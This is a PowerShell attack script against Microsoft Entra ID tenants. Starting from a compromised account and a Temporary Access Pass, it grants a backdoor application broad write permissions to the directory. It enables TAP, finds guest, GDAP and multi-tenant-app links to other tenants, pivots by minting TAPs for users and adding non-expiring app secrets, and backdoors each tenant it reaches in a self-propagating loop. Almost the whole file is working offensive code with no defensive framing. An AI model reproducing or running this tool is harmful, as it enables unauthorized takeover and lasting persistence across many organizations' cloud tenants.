########################
# Global parameters
# App used to add as a backdoor access to breached tenant
$appId = "AppID" # AppId
$appSecret = "AppSecret" # AppSecret
# Credentials to the initial compromised account from which to begin
$username = 'john.doe@contoso.com'
$tap = 'SSVwv2NF' # Temporary Access Password
########################

#region GUI
Add-Type -AssemblyName System.Windows.Forms
# Create the form with dark backgrounz
$form = New-Object System.Windows.Forms.Form
$form.Text = "Tenants with access"
$form.Width = 600
$form.Height = 500
$form.StartPosition = [System.Windows.Forms.FormStartPosition]::Manual
$form.Location = New-Object System.Drawing.Point(0,0)
$form.BackColor = [System.Drawing.Color]::Black
# Create the RichTextBox with dark background and light text color
$richTextBox = New-Object System.Windows.Forms.RichTextBox
$richTextBox.Dock = [System.Windows.Forms.DockStyle]::Fill
$richTextBox.Multiline = $true
$richTextBox.ScrollBars = "Vertical"
$richTextBox.BackColor = [System.Drawing.Color]::Black
$richTextBox.ForeColor = [System.Drawing.Color]::White
$richTextBox.Font = New-Object System.Drawing.Font("Consolas", 12)
$richTextBox.ReadOnly = $true
$form.Controls.Add($richTextBox)
$form.show()

function Show-TenantsInBox {
    param (
        [hashtable]$tenantsDb
    )

    $richTextBox.Text = ""
    foreach($tenantId in $tenantsDb.Keys) {
        $tenant = $tenantsDb[$tenantId]
        if($tenant.pwned) {
            $color = [System.Drawing.Color]::Red
            $icon = "🔥"
        }
        elseif($tenant.access) {
            $color = [System.Drawing.Color]::Yellow
            $icon = "🏷️"
        }
        else {
            $color = [System.Drawing.Color]::White
            $icon = "🚫"
        }

        $richTextBox.AppendText("[")
        $richTextBox.SelectionColor = $color
        $richTextBox.AppendText($icon)
        $richTextBox.SelectionColor = [System.Drawing.Color]::White
        $richTextBox.AppendText("] "+$tenant.displayName+" ("+$tenant.id+")`n")  
        [System.Windows.Forms.Application]::DoEvents()
    }
}
#endregion

#region Datatypes
Enum EdgeStatus {
    Unknown
    Valid
    Invalid
}

class AttackEdge {
    [PSCustomObject] $sourceTenant = [PSCustomObject]@{'id' = $null; 'displayName' = $null}
    [PSCustomObject] $targetTenant = [PSCustomObject]@{'id' = $null; 'displayName' = $null}
    [bool] $evaluated = $false
    [EdgeStatus] $status = 'Unknown'
    [PSCustomObject] $attribs = [PSCustomObject]@{
        'sourceObject' = [PSCustomObject]@{'id' = $null; 'displayName' = $null}
        'objectType' = 'Unknown'
        'edgeType' = 'Unknown'
        'roles' = @()
    }
    [PSCustomObject] $tokens = [PSCustomObject]@{'at' = $null; 'rt' = $null}    
}

class Tenant {
    [string] $id
    [string] $displayName
    [bool] $access = $false
    [bool] $pwned = $false
    [PSCustomObject] $tokens = [PSCustomObject]@{'at' = $null; 'rt' = $null}    
}

class Application {
    [string] $id
    [string] $displayName
    [string] $secret
    [string[]] $roles
    [System.Collections.Queue] $potentialTenants
}
#endregion

#region Helper functions
# Function to lookup TenantDisplayName from TenantID
$tenantsLookupTable = @{}
function Get-TenantDisplayName {
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory=$True,ValueFromPipeline)]
        [String]$tenantId
    )    

    $tenants = $script:tenantsLookupTable
    if($tenants.ContainsKey($tenantId)) {
        return $tenants[$tenantId]
    }
    else {
        $ResolveUri = ("https://graph.microsoft.com/beta/tenantRelationships/findTenantInformationByDomainName(domainName='{0}')" -f $tenantId)
        $tenantDisplayName = (Invoke-MgGraphRequest -Method Get -Uri $ResolveUri).DisplayName
        $Script:tenantsLookupTable[$tenantId] = $tenantDisplayName
        return $tenantDisplayName
    }
}

function Enable-TAPAuthenticationMethod {
    param (
        [Parameter(Mandatory=$true)]
        [string]$token
    )    

    # Connect to tenant
    $secureToken = ConvertTo-SecureString $token -AsPlainText -Force
    Connect-MgGraph -AccessToken $secureToken -NoWelcome

    # Get TAP auth method
    $authenticationMethods = Get-MgPolicyAuthenticationMethodPolicy
    $authenticationMethodsTap = $authenticationMethods.AuthenticationMethodConfigurations | Where-Object Id -eq 'TemporaryAccessPass'
    # If TAP is disabled, enable it
    if($authenticationMethodsTap.State -eq "disabled") {
        $authenticationMethodsTap.State = "enabled"
        Update-MgPolicyAuthenticationMethodPolicy -AuthenticationMethodConfigurations $authenticationMethods.AuthenticationMethodConfigurations
    }
}

function Get-PotentialTenantsFromAppDb {
    $objs = @()    
    $used = @()
    foreach($key in $applicationsDb.Keys) {
        $appObj = $applicationsDb[$key]
        foreach($potTenant in $appObj.potentialTenants) {
            if($used -notcontains $potTenant) {
                $used += $potTenant
                $objs += @{'id' = $potTenant; 'displayName' = (Get-TenantDisplayName -tenantId $potTenant)}
            }                
        }
    }
    return $objs
}

function Resolve-EntraIdRolesId {
    [CmdletBinding()]
    param (
        [Parameter()]
        [string[]]
        $rolesIds
    )
    $entraIdRoles = @{
        "9b895d92-2cd3-44c7-9d02-a6ac2d5ea5c3" = "Application Administrator"
        "cf1c38e5-3621-4004-a7cb-879624dced7c" = "Application Developer"
        "9c6df0f2-1e7c-4dc3-b195-66dfbd24aa8f" = "Attack Payload Author"
        "c430b396-e693-46cc-96f3-db01bf8bb62a" = "Attack Simulation Administrator"
        "58a13ea3-c632-46ae-9ee0-9c0d43cd7f3d" = "Attribute Assignment Administrator"
        "ffd52fa5-98dc-465c-991d-fc073eb59f8f" = "Attribute Assignment Reader"
        "8424c6f0-a189-499e-bbd0-26c1753c96d4" = "Attribute Definition Administrator"
        "1d336d2c-4ae8-42ef-9711-b3604ce3fc2c" = "Attribute Definition Reader"
        "c4e39bd9-1100-46d3-8c65-fb160da0071f" = "Authentication Administrator"
        "0526716b-113d-4c15-b2c8-68e3c22b9f80" = "Authentication Policy Administrator"
        "9f06204d-73c1-4d4c-880a-6edb90606fd8" = "Azure AD Joined Device Local Administrator"
        "e3973bdf-4987-49ae-837a-ba8e231c7286" = "Azure DevOps Administrator"
        "7495fdc4-34c4-4d15-a289-98788ce399fd" = "Azure Information Protection Administrator"
        "aaf43236-0c0d-4d5f-883a-6955382ac081" = "B2C IEF Keyset Administrator"
        "3edaf663-341e-4475-9f94-5c398ef6c070" = "B2C IEF Policy Administrator"
        "b0f54661-2d74-4c50-afa3-1ec803f12efe" = "Billing Administrator"
        "892c5842-a9a6-463a-8041-72aa08ca3cf6" = "Cloud App Security Administrator"
        "158c047a-c907-4556-b7ef-446551a6b5f7" = "Cloud Application Administrator"
        "7698a772-787b-4ac8-901f-60d6b08affd2" = "Cloud Device Administrator"
        "17315797-102d-40b4-93e0-432062caca18" = "Compliance Administrator"
        "e6d1a23a-da11-4be4-9570-befc86d067a7" = "Compliance Data Administrator"
        "b1be1c3e-b65d-4f19-8427-f6fa0d97feb9" = "Conditional Access Administrator"
        "5c4f9dcd-47dc-4cf7-8c9a-9e4207cbfc91" = "Customer LockBox Access Approver"
        "38a96431-2bdf-4b4c-8b6e-5d3d8abac1a4" = "Desktop Analytics Administrator"
        "88d8e3e3-8f55-4a1e-953a-9b9898b8876b" = "Directory Readers"
        "d29b2b05-8046-44ba-8758-1e26182fcf32" = "Directory Synchronization Accounts"
        "9360feb5-f418-4baa-8175-e2a00bac4301" = "Directory Writers"
        "8329153b-31d0-4727-b945-745eb3bc5f31" = "Domain Name Administrator"
        "44367163-eba1-44c3-98af-f5787879f96a" = "Dynamics 365 Administrator"
        "3f1acade-1e04-4fbc-9b69-f0302cd84aef" = "Edge Administrator"
        "29232cdf-9323-42fd-ade2-1d097af3e4de" = "Exchange Administrator"
        "31392ffb-586c-42d1-9346-e59415a2cc4e" = "Exchange Recipient Administrator"
        "6e591065-9bad-43ed-90f3-e9424366d2f0" = "External ID User Flow Administrator"
        "0f971eea-41eb-4569-a71e-57bb8a3eff1e" = "External ID User Flow Attribute Administrator"
        "be2f45a1-457d-42af-a067-6ec1fa63bc45" = "External Identity Provider Administrator"
        "62e90394-69f5-4237-9190-012177145e10" = "Global Administrator"
        "f2ef992c-3afb-46b9-b7cf-a126ee74c451" = "Global Reader"
        "fdd7a751-b60b-444a-984c-02652fe8fa1c" = "Groups Administrator"
        "95e79109-95c0-4d8e-aee3-d01accf2d47b" = "Guest Inviter"
        "729827e3-9c14-49f7-bb1b-9608f156bbb8" = "Helpdesk Administrator"
        "8ac3fc64-6eca-42ea-9e69-59f4c7b60eb2" = "Hybrid Identity Administrator"
        "45d8d3c5-c802-45c6-b32a-1d70b5e1e86e" = "Identity Governance Administrator"
        "eb1f4a8d-243a-41f0-9fbd-c7cdf6c5ef7c" = "Insights Administrator"
        "31e939ad-9672-4796-9c2e-873181342d2d" = "Insights Business Leader"
        "3a2c62db-5318-420d-8d74-23affee5d9d5" = "Intune Administrator"
        "74ef975b-6605-40af-a5d2-b9539d836353" = "Kaizala Administrator"
        "b5a8dcf3-09d5-43a9-a639-8e29ef291470" = "Knowledge Administrator"
        "744ec460-397e-42ad-a462-8b3f9747a02c" = "Knowledge Manager"
        "4d6ac14f-3453-41d0-bef9-a3e0c569773a" = "License Administrator"
        "ac16e43d-7b2d-40e0-ac05-243ff356ab5b" = "Message Center Privacy Reader"
        "790c1fb9-7f7d-4f88-86a1-ef1f95c05c1b" = "Message Center Reader"
        "d24aef57-1500-4070-84db-2666f29cf966" = "Modern Commerce User"
        "d37c8bed-0711-4417-ba38-b4abe66ce4c2" = "Network Administrator"
        "2b745bdf-0803-4d80-aa65-822c4493daac" = "Office Apps Administrator"
        "4ba39ca4-527c-499a-b93d-d9b492c50246" = "Partner Tier1 Support"
        "e00e864a-17c5-4a4b-9c06-f5b95a8d5bd8" = "Partner Tier2 Support"
        "966707d0-3269-4727-9be2-8c3a10f19b9d" = "Password Administrator"
        "a9ea8996-122f-4c74-9520-8edcd192826c" = "Power BI Administrator"
        "11648597-926c-4cf3-9c36-bcebb0ba8dcc" = "Power Platform Administrator"
        "644ef478-e28f-4e28-b9dc-3fdde9aa0b1f" = "Printer Administrator"
        "e8cef6f1-e4bd-4ea8-bc07-4b8d950f4477" = "Printer Technician"
        "7be44c8a-adaf-4e2a-84d6-ab2649e08a13" = "Privileged Authentication Administrator"
        "e8611ab8-c189-46e8-94e1-60213ab1f814" = "Privileged role Administrator"
        "4a5d8f65-41da-4de4-8968-e035b65339cf" = "Reports Reader"
        "0964bb5e-9bdb-4d7b-ac29-58e794862a40" = "Search Administrator"
        "8835291a-918c-4fd7-a9ce-faa49f0cf7d9" = "Search Editor"
        "194ae4cb-b126-40b2-bd5b-6091b380977d" = "Security Administrator"
        "5f2222b1-57c3-48ba-8ad5-d4759f1fde6f" = "Security Operator"
        "5d6b6bb7-de71-4623-b4af-96380a352509" = "Security Reader"
        "f023fd81-a637-4b56-95fd-791ac0226033" = "Service Support Administrator"
        "f28a1f50-f6e7-4571-818b-6a12f2af6b6c" = "SharePoint Administrator"
        "75941009-915a-4869-abe7-691bff18279e" = "Skype for Business Administrator"
        "69091246-20e8-4a56-aa4d-066075b2a7a8" = "Teams Administrator"
        "baf37b3a-610e-45da-9e62-d9d1e5e8914b" = "Teams Communications Administrator"
        "f70938a0-fc10-4177-9e90-2178f8765737" = "Teams Communications Support Engineer"
        "fcf91098-03e3-41a9-b5ba-6f0ec8188a12" = "Teams Communications Support Specialist"
        "3d762c5a-1b6c-493f-843e-55a3b42923d4" = "Teams Devices Administrator"
        "75934031-6c7e-415a-99d7-48dbd49e875e" = "Usage Summary Reports Reader"
        "fe930be7-5e62-47db-91af-98c3a49a38b1" = "User Administrator"
        "e300d9e7-4a2b-4295-9eff-f1c78b36cc98" = "Virtual Visits Administrator"
        "11451d60-acb2-45eb-a7d6-43d0f0125c13" = "Windows 365 Administrator"
        "32696413-001a-46ae-978c-ce0f6b3620d2" = "Windows Update Deployment Administrator"
    }

    $roles = @()
    foreach($roleId in $rolesIds) {
        if($entraIdRoles[$roleId]) {
            $roles += $entraIdRoles[$roleId]
        }
    }
    return $roles -join ", "
}

function Get-AccessTokenForApp {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory=$true)]
        [string]$appId,
        [Parameter(Mandatory=$true)]
        [string]$appSecret,
        [Parameter(Mandatory=$true)]
        [string]$tenantId
    )    

    $params = @{                
        Uri    = "https://login.microsoftonline.com/$tenantId/oauth2/v2.0/token"
        Method = "POST"
        Body   = @{
            client_id     = $appId
            client_secret = $appSecret
            grant_type    = "client_credentials"
            scope         = "https://graph.microsoft.com/.default"
        }
    }
    $response = Invoke-RestMethod @params
    return $response.access_token    
}

#endregion

#region Reconnaissance functions
function Get-AttackEdgesGdap {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory=$true)]
        [string]$token
    )

    # Connect to tenant
    $secureToken = ConvertTo-SecureString $token -AsPlainText -Force
    Connect-MgGraph -AccessToken $secureToken -NoWelcome

    $edges = @()
    $sourceTenantId = (Get-MgContext).TenantId
    $relations = (Get-MgTenantRelationshipDelegatedAdminRelationship -All) | Where-Object Status -eq 'Active'
    foreach($relation in $relations) {
        $gdapAssignments = @((Get-MgTenantRelationshipDelegatedAdminRelationshipAccessAssignment -DelegatedAdminRelationshipId $relation.id) | Where-Object Status -eq 'Active')

        foreach($gdapAssignment in $gdapAssignments) {
            $edge = [AttackEdge]::new()
            # Edge Endpoints
            $edge.sourceTenant.id = $sourceTenantId
            $edge.targetTenant.id = $relation.Customer.TenantId
            $edge.targetTenant.displayName = $relation.Customer.DisplayName
            # Edge Attribs
            $edge.attribs.sourceObject.id = $gdapAssignment.AccessContainer.AccessContainerId
            $edge.attribs.sourceObject.displayName = (Get-MgGroup -GroupId $edge.attribs.sourceObject.id).DisplayName
            $edge.attribs.objectType = 'Group'
            $edge.attribs.edgeType = 'GDAP'
            $edge.attribs.roles = @($gdapAssignment.AccessDetails.UnifiedRoles.RoleDefinitionId)
            $edges += $edge
        }
    }

    return $edges
}
function Get-AttackEdgesGuest {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory=$true)]
        [string]$token
    )

    # Connect to tenant
    $secureToken = ConvertTo-SecureString $token -AsPlainText -Force
    Connect-MgGraph -AccessToken $secureToken -NoWelcome

    $edges = @()
    $sourceTenantId = (Get-MgContext).TenantId
    $signInLogs = Get-MgBetaAuditLogSignIn -Filter "(signInEventTypes/any(t: t eq 'interactiveUser')) and crossTenantAccessType has microsoft.graph.signInAccessType'b2bCollaboration' and (contains(tolower(homeTenantId), '$sourceTenantId'))" -All
    $uniqueSingInLogs = @($signInLogs | Select-Object UserId, UserPrincipalName, ResourceTenantId -Unique)

    foreach($signInLog in $uniqueSingInLogs) {
        $edge = [AttackEdge]::new()
        # Edge Endpoints
        $edge.sourceTenant.id = $sourceTenantId
        $edge.sourceTenant.displayName = Get-TenantDisplayName($sourceTenantId)
        $edge.targetTenant.id = $signInLog.ResourceTenantId
        $edge.targetTenant.displayName = Get-TenantDisplayName($signInLog.ResourceTenantId)
        # Edge Attribs
        $edge.attribs.sourceObject.id = $signInLog.UserId
        $edge.attribs.sourceObject.displayName = $signInLog.UserPrincipalName
        $edge.attribs.objectType = 'User'
        $edge.attribs.edgeType = 'Guest'
        $edge.attribs.roles = @()
        $edges += $edge
    }

    return $edges
}
function Get-AttackEdgesApp {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory=$true)]
        [string]$token
    )

    # Connect to tenant
    $secureToken = ConvertTo-SecureString $token -AsPlainText -Force
    Connect-MgGraph -AccessToken $secureToken -NoWelcome

    $edges = @()
    $sourceTenantId = (Get-MgContext).TenantId
    $signInLogs = Get-MgBetaAuditLogSignIn -Filter "(signInEventTypes/any(t: t eq 'servicePrincipal')) and ResourceServicePrincipalId eq  ''" -All -ErrorAction SilentlyContinue
    $uniqueSingInLogs = @($signInLogs | Select-Object AppId, AppDisplayName, ServicePrincipalId -Unique)

    foreach($signInLog in $uniqueSingInLogs) {
        if($signInLog.AppId -ne "14ae33ab-0d82-4429-b09e-6da7bd4f7afc") {
            $edge = [AttackEdge]::new()
            # Edge Endpoints
            $edge.sourceTenant.id = $sourceTenantId
            $edge.sourceTenant.displayName = Get-TenantDisplayName($sourceTenantId)
            # Edge Attribs
            $edge.attribs.sourceObject.id = $signInLog.AppId
            $edge.attribs.sourceObject.displayName = $signInLog.AppDisplayName
            $edge.attribs.objectType = 'App'
            $edge.attribs.edgeType = 'App'
            $edge.attribs.roles = @()
            $edges += $edge
        }
    }

    # If there are some edges fetch candidates for the applications
    if($edges.count) {
            # try to find candidates
            $logsCandidates = Get-MgBetaAuditLogSignIn -Filter "(homeTenantId ne '$sourceTenantId') or (resourceTenantId ne '$sourceTenantId')" -Property homeTenantId, ResourceTenantId -All
            $candidates = $logsCandidates.HomeTenantId + $logsCandidates.ResourceTenantId | Where-Object { $_ -ne $sourceTenantId } | select -Unique
            $candidatesQueue = New-Object System.Collections.Queue 
            foreach($candidate in $candidates) {$candidatesQueue.Enqueue($candidate)}
    }

    # Populate app db
    foreach($edge in $edges) {
        $appId = $edge.attribs.sourceObject.id
        if($applicationsDb.Keys -notcontains $appId) {
            $appObj = [Application]::new()
            $appObj.id = $appId
            $appObj.displayName = $edge.attribs.sourceObject.displayName
            $app = Get-MgApplication -Search "AppId:$appId" -ConsistencyLevel eventual
            $appObj.roles = $app.RequiredResourceAccess
            $appObj.potentialTenants = $candidatesQueue.clone()
            $applicationsDb[$appId] = $appObj
        }
    }

    return $edges
}
#endregion

#region Pivoting and backdooring functions

<#
.SYNOPSIS
Attempts to impersonate a user by using Temporary Access Password to pivot into the external tenant.

.PARAMETER token
Access token to the source tenant with privileged permissins.

.PARAMETER edge
Edge to evaluate

#>
function Invoke-PivotGuestEdge {
    [Alias("Invoke-PivotGdapEdge")]
    [CmdletBinding()]
    param (
        [Parameter(Mandatory=$true)]
        [string]$token,
        [Parameter(Mandatory=$true)]
        [AttackEdge]$edge
    )

    # Connect to tenant
    $secureToken = ConvertTo-SecureString $token -AsPlainText -Force
    Connect-MgGraph -AccessToken $secureToken -NoWelcome

    $edge.status = 'Invalid'
    $edge.evaluated = $true

    if($edge.attribs.objectType -eq 'User') {
        $user = Get-MgUser -UserId $edge.attribs.sourceObject.id
    }
    elseif($edge.attribs.objectType -eq 'Group') {
        $groupMembers = Get-MgGroupMemberAsUser -GroupId $edge.attribs.sourceObject.id  -Property DisplayName, UserPrincipalName, Id, Mail, AccountEnabled 
        # If group doesn't contain any enabled user
        if($groupMembers.count -eq 0) {
            retrun $edge.status
        }
        $user = $groupMembers | Where-Object AccountEnabled -eq 'True' | Select-Object -First 1
    }
    else {
        throw "Unkonwn object type"
    }

    $userTap = New-MgUserAuthenticationTemporaryAccessPassMethod -UserId $user.Id
    $username = $user.UserPrincipalName
    $password = ConvertTo-SecureString "aaa" -AsPlainText -Force
    $psCred = New-Object System.Management.Automation.PSCredential -ArgumentList ($username, $password)
    try {
        $tokenPivoted = Get-AADIntAccessTokenForMSGraph -Credentials $psCred -TAP $userTap.TemporaryAccessPass -Tenant $edge.targetTenant.id -OTPSecretKey '1234'
        if($tokenPivoted) {
            $tokenPivotedParsed = Read-AADIntAccesstoken $tokenPivoted
            $edge.status = 'Valid'
            $edge.tokens.at = $tokenPivoted
            $edge.attribs.roles = Resolve-EntraIdRolesId $tokenPivotedParsed.wids
        }
    }
    catch {
    }

    return $edge.status
}    
    
function Invoke-PivotAppEdge {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory=$true)]
        [string]$token,
        [Parameter(Mandatory=$true)]
        [AttackEdge]$edge
    )

    # Connect to tenant
    $secureToken = ConvertTo-SecureString $token -AsPlainText -Force
    Connect-MgGraph -AccessToken $secureToken -NoWelcome

    $edge.status = 'Invalid'
    $edge.evaluated = $true

    $applicationObj = $applicationsDb[$edge.attribs.sourceObject.id]
    # If application still doesn't have access secret add it
    if($null -eq $applicationObj.secret) {
        $params = @{
            passwordCredential = @{
                displayName = "Access"
                    EndDateTime = "2100-01-01T00:00:00Z"
            }
        }
        $app = Get-MgApplication -Search "AppId:$($edge.attribs.sourceObject.id)" -ConsistencyLevel eventual
        $secret = Add-MgApplicationPassword -ApplicationId $app.id -BodyParameter $params
        $applicationObj.secret = $secret.SecretText
        Write-Host "Added new secret for app $($applicationObj.displayName) (Secret: $($applicationObj.secret))"
        # Wait for it to get applied so we can use it to login
        Sleep 20
    }

    $found = $false
    while($found -eq $false -and $applicationObj.potentialTenants.count) {
        $potentialTenant = $applicationObj.potentialTenants.Dequeue()
        try {
            $appToken = Get-AccessTokenForApp -appId $applicationObj.id -appSecret $applicationObj.secret -tenantId $potentialTenant
            $edge.status = 'Valid'
            $edge.targetTenant.id = $potentialTenant
            $edge.targetTenant.displayName = Get-TenantDisplayName -tenantId $potentialTenant
            $edge.tokens.at = $appToken
            $appTokenParsed = Read-AADIntAccesstoken $appToken
            $edge.attribs.roles = (Resolve-EntraIdRolesId $appTokenParsed.wids) + " " + $appTokenParsed.roles
            $found = $true
        }
        catch {
            # Wrong tenant
        }
    }    

    return $edge.status    
}

<#
.SYNOPSIS
Consents the specified Application to the target tenant for future access.

.PARAMETER token
Bearer access token

.PARAMETER appId
ID of application which to consent into the target tenant. Target Tenant ID is taken from the access token.
#>
function Enable-TenantAppBackdoor {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory=$true)]
        [string]$token,
        [Parameter(Mandatory=$true)]
        [string]$appId
    )

    $appScopes = @(
        'b0afded3-3588-46d8-8b3d-9842eff778da' # AuditLog.Read.All
        '1bfefb4e-e0b5-418b-a88f-73c46d2cc8e9' # Application.ReadWrite.All
        '19dbc75e-c2e2-444c-a770-ec69d8559fc7' # Directory.ReadWrite.All
        '29c18626-4985-4dcd-85c0-193eef327366' # Policy.ReadWrite.AuthenticationMethod
        '50483e42-d915-4231-9639-7fdb7fd190e5' # UserAuthenticationMethod.ReadWrite.All
        '31e08e0a-d3f7-4ca2-ac39-7343fb83e8ad' # RoleManagementPolicy.ReadWrite.Directory
        '06b708a9-e830-4db3-a914-8e69da51d44f' # AppRoleAssignment.ReadWrite.All
        'cac88765-0581-4025-9725-5ebc13f729ee' # CrossTenantInformation.ReadBasic.All
        'cc13eba4-8cd8-44c6-b4d4-f93237adce58' # DelegatedAdminRelationship.ReadWrite.All
    )
    $delegScopes = "DelegatedAdminRelationship.Read.All Directory.Read.All"

    # Connect to tenant
    $secureToken = ConvertTo-SecureString $token -AsPlainText -Force
    Connect-MgGraph -AccessToken $secureToken -NoWelcome

    # Create a ServicePrincipal for the app if needed
    try {
        $sp = Get-MgServicePrincipal -Search "AppId:$appId" -ConsistencyLevel eventual -ErrorAction Stop
    }
    catch {
        return $false
    }

    if($null -eq $sp) {
        try {
            $sp = New-MgServicePrincipal -AppId $appId -ErrorAction Stop
        }
        catch {
            return $false
        }
    }

    $msGraphSp = Get-MgServicePrincipal -Search "AppId:00000003-0000-0000-c000-000000000000" -ConsistencyLevel eventual

    # Delegated permissions
    # If delegated permissions already exists, update them
    $delegPermissions = (Get-MgServicePrincipalOauth2PermissionGrant -ServicePrincipalId $sp.id) | Where-Object {$_.ConsentType -eq "AllPrincipals" -and $_.ResourceId -eq $msGraphSp.id}
    if($delegPermissions) {
        Update-MgOauth2PermissionGrant -OAuth2PermissionGrantId $delegPermissions.Id -Scope $delegScopes
    }
    # Add delegated Permissions if not present yet
    else {    
        $params = @{
            "ClientId" = $sp.id
            "ConsentType" = "AllPrincipals"
            "ResourceId" = $msGraphSp.Id
            "Scope" = $delegScopes
        }
        New-MgOauth2PermissionGrant -BodyParameter $params | Out-Null
    }

    # Application Permissions
    foreach($appScope in $appScopes) {
        $params = @{
            principalId = $sp.Id
            resourceId = $msGraphSp.Id
            appRoleId = $appScope
        }

        try{
            New-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $sp.Id -BodyParameter $params -ErrorAction Stop | Out-Null
        }
        catch {
            if($_.ErrorDetails.Message -notmatch 'Permission being assigned already exists') {
            # It looks like we are not able to install the backdoor
            return $false
            }
        }
    }

    return $true
}
#endregion

Import-Module -Name "AADInternals" | Out-Null
#######################
# MAIN
#######################
$tenantsDb = @{}
$applicationsDb = @{}
$edgesDb = @()
$tenantStack = New-Object System.Collections.Queue 

# Login into the tenant
$password = ConvertTo-SecureString 'aaa' -AsPlainText -Force
$psCred = New-Object System.Management.Automation.PSCredential -ArgumentList ($username, $password)
$token = Get-AADIntAccessTokenForMSGraph -Credentials $psCred -TAP $tap

# Backdoored
if(Enable-TenantAppBackdoor -token $token -appId $appId) {
    $tenant = [Tenant]::new()
    $tenant.id = (Read-AADIntAccesstoken -AccessToken $token).tid
    $tenant.displayName = Get-TenantDisplayName -tenantId $tenant.id
    $tenant.pwned = $true
    $tenant.access = $true
    $tenantsDb[$tenant.id] = $tenant
    $tenantStack.Enqueue($tenant.id)
    Write-Host "🔥 Backdoored tenant: $($tenant.displayName) ($($tenant.id))" -ForegroundColor Red
    Show-TenantsInBox -TenantsDb $tenantsDb
}

while($tenantStack.Count) {
    $tenant = $tenantsDb[$tenantStack.Dequeue()]
    $tenantToken = Get-AccessTokenForApp -appId $appId -appSecret $appSecret -tenantId $tenant.id
    $tenant.tokens.at = $tenantToken
    Write-Host "🔎 Scanning tenant: $($tenant.displayName) ($($tenant.id))" -ForegroundColor Yellow

    Enable-TAPAuthenticationMethod -token $tenantToken

    $edgesGuest = @(Get-AttackEdgesGuest -token $tenantToken)
    Write-Host " * Guest edges: $($edgesGuest.count)" -ForegroundColor Yellow
    $edgesGdap = @(Get-AttackEdgesGdap -token $tenantToken)
    Write-Host " * GDAP edges: $($edgesGdap.count)" -ForegroundColor Yellow
    $edgesApp = @(Get-AttackEdgesApp -token $tenantToken)
    Write-Host " * App edges: $($edgesApp.count)" -ForegroundColor Yellow
    $edges = $edgesGuest + $edgesGdap + $edgesApp

    # If new tenants has been found add them to the Db
    $targetTenants = @($edges.targetTenant | Where-Object {$_.id -ne $null} | Select-Object -Unique)
    $targetTenants += Get-PotentialTenantsFromAppDb
    # Add potential tenants from Apps as well
    foreach($targetTenant in $targetTenants) {
        if(!$tenantsDb.ContainsKey($targetTenant.id)) {
            $newTenant = [Tenant]::new()
            $newTenant.id = $targetTenant.id
            $newTenant.displayName = $targetTenant.displayName
            $tenantsDb[$newTenant.id] = $newTenant
            Write-Host "⭐ Detected new tenant: " -NoNewline     
            Write-Host "$($newTenant.displayName) ($($newTenant.id))" -ForegroundColor Green       
            Show-TenantsInBox -TenantsDb $tenantsDb
        }
    }

    foreach($edge in $edges) {
        switch ($edge.attribs.edgeType) {
            'Guest' { $result = Invoke-PivotGuestEdge -token $tenantToken -edge $edge }
            'GDAP' { $result = Invoke-PivotGdapEdge -token $tenantToken -edge $edge }
            'App' { $result = Invoke-PivotAppEdge -token $tenantToken -edge $edge }
            Default { $result = 'Invalid'}
        }

        # If pivot was succesfull and it is a first access to the tenant
        if($result -eq 'Valid' -and $tenantsDb[$edge.targetTenant.id].access -eq $false) {
            $tenantsDb[$edge.targetTenant.id].access = $true
            Write-Host "🏠 Gained access to tenant: $($edge.targetTenant.displayName) ($($edge.targetTenant.id))" -ForegroundColor DarkYellow
            Write-Host " Path: " -NoNewline
            Write-Host "$($edge.sourceTenant.displayName)" -NoNewline -ForegroundColor DarkYellow
            Write-Host " ➡️  " -NoNewline
            Write-Host "$($edge.targetTenant.displayName)" -NoNewline -ForegroundColor DarkYellow
            Write-Host " as " -NoNewline
            Write-Host "$($edge.attribs.sourceObject.displayName) " -NoNewline -ForegroundColor DarkYellow
            Write-Host "(Roles: $($edge.attribs.roles))"
            #Write-Host "🛣️ $($edge.sourceTenant.displayName) => $($edge.targetTenant.displayName) as $($edge.attribs.sourceObject.displayName) ($($edge.attribs.roles))"
            Show-TenantsInBox -TenantsDb $tenantsDb
        }

        # If pivot was succesfull and the target tenant hasn't been backdoored yet
        if($result -eq 'Valid' -and $tenantsDb[$edge.targetTenant.id].pwned -eq $false) {
            if(Enable-TenantAppBackdoor -token $edge.tokens.at -appId $appId) {
                Write-Host "🔥 Fully compromised tenant: $($edge.targetTenant.displayName) ($($edge.targetTenant.id))" -ForegroundColor Red
                $tenantsDb[$edge.targetTenant.id].pwned = $true                
                $tenantStack.Enqueue($edge.targetTenant.id)
                Show-TenantsInBox -TenantsDb $tenantsDb
            }
        }
    }

    $edgesDb += $edges
}

$tenantsdb | ConvertTo-Json -Depth 10 > DBTenants.csv          
$edgesdb | ConvertTo-Json -Depth 10 > DBEdges.csv    
$applicationsdb | ConvertTo-Json -Depth 10 > DBapplications.csv    
Write-Host "✅ Done"
$pwned = 0
$access = 0
foreach($key in $tenantsDb.Keys) {
    $tenant = $tenantsDb[$key]
    if($tenant.access) {$access++}
    if($tenant.pwned) {$pwned++}
}
Write-Host "Fully comprimised tenants: $pwned"
Write-Host "Tenants with access: $access"
$form.hide()
$form.ShowDialog()
